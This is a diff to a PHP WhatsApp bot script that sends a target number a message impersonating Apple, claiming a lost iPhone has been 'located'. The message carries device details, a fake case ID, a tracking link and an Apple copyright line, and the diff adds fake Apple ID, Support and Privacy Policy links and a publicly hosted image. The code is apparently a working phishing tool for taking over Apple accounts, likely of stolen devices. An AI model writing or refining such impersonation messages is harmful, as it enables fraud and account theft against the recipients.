@@ -124,14 +124,25 @@ if ($res['code'] === 200) {
 // ETAPA 3: ENVIAR MENSAGEM
 echo "> 3. Enviando template Apple para {$target_number}...\n";
 $vars = ['{modelo}' => $iphone_modelo, '{cor}' => $iphone_cor, '{capacidade}' => $iphone_capacidade, '{numero}' => $target_number];
-$template = "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar o processo de recuperação, digite *Ajuda*\n> *Copyright ©️ 2025 Apple Inc*";
+$template = "*Dispositivo Localizado*\n" .
+            "> Dispositivo: *{modelo} {cor} {capacidade}*\n" .
+            "> Número de emergencia: *({numero})*\n" .
+            "> ID de caso: *000-A946*\n" .
+            "Para iniciar o processo de recuperação, digite *Ajuda*\n" .
+            "> *Copyright ©️ 2025 Apple Inc*\n" .
+            "> | Apple ID | Support | Privacy Policy";
+            
 $finalMessage = strtr($template, $vars);
+
+$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
+$baseUrl = $protocol . "://" . $_SERVER['HTTP_HOST'];
+$publicMediaPath = $baseUrl . '/uploads/Dynamic.png';
 
 $payload = [
     'session' => $session_id,
     'number' => $target_number,
     'message' => $finalMessage,
-    'mediaPath' => 'C:/Users/Christofer Mayon/Desktop/robo/botzap/uploads/Dynamic.png',
+    'mediaPath' => $publicMediaPath,
     'trackLink' => $trackLink,
     'language' => $idioma
 ];
